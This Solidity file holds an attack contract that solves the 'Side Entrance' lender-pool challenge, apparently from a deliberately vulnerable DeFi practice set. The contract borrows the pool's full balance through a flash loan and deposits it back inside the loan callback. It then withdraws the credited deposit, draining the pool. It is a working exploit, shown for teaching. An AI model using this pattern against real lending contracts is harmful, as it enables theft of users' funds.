// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.25;
import "../src/SideEntranceLenderPool.sol";

contract AttackContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public target;

    constructor(address _target) {
        target = SideEntranceLenderPool(_target);
    }

    function attack() external payable {
        target.flashLoan(address(target).balance);
        target.withdraw();
    }

    function withdraw(address payable to) external payable {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }

    fallback() external payable {}

    receive() external payable {}

    function execute() external payable {
        target.deposit{value: msg.value}();
    }
}
